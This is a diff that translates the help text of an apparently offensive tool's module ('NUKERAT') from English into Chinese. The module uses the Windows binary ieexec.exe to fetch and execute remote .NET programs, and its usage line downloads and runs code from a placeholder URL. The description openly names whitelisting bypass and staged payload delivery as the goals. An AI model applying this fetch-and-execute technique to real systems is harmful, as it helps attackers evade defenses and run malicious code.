@@ -1,17 +1,17 @@
-ABOUT
+关于
     Undocumented .NET host that loads managed code from a URL.
     LOLBAS downloads and executes remote .NET executables for AWL
     bypass and staged payload delivery.
 
-USAGE:
+用法：
     ieexec.exe {REMOTEURL:.exe}
 
-EXAMPLES:
+示例：
     ieexec.exe {REMOTEURL:.exe}
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     ieexec.exe {REMOTEURL:.exe}
